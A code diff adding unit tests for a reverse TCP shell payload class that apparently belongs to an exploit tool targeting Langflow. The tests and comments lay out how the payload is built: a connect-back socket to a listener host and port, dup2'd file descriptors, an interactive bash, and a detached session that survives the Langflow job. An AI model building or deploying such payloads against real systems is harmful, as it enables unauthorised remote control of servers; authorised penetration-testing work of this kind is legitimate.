@@ -87,3 +87,33 @@ def test_reverse_shell_payload_is_blocking():
 def test_reverse_shell_payload_contains_socket():
     p = ReverseTcpShellPayload(lhost="192.168.1.10", lport=4444)
     assert "socket" in p.load_payload()
+
+
+def test_reverse_shell_payload_uses_popen_not_execv():
+    p = ReverseTcpShellPayload(lhost="192.168.1.10", lport=4444)
+    code = p.load_payload()
+    assert "subprocess.Popen" in code
+    assert "os.execv" not in code
+
+
+def test_reverse_shell_payload_bash_interactive_flag():
+    # '-i' keeps bash interactive so the connection stays open without a TTY
+    p = ReverseTcpShellPayload(lhost="192.168.1.10", lport=4444)
+    code = p.load_payload()
+    assert "'/bin/bash', '-i'" in code or "['/bin/bash', '-i']" in code
+
+
+def test_reverse_shell_payload_detaches_from_parent():
+    # start_new_session=True detaches bash from the Langflow job so it is not
+    # killed when the thread/job completes.
+    p = ReverseTcpShellPayload(lhost="192.168.1.10", lport=4444)
+    code = p.load_payload()
+    assert "start_new_session=True" in code
+    assert "_p.wait()" not in code
+
+
+def test_reverse_shell_payload_uses_dup2():
+    # Socket fd is dup2'd onto 0/1/2 so the detached child inherits them
+    p = ReverseTcpShellPayload(lhost="192.168.1.10", lport=4444)
+    code = p.load_payload()
+    assert "os.dup2" in code
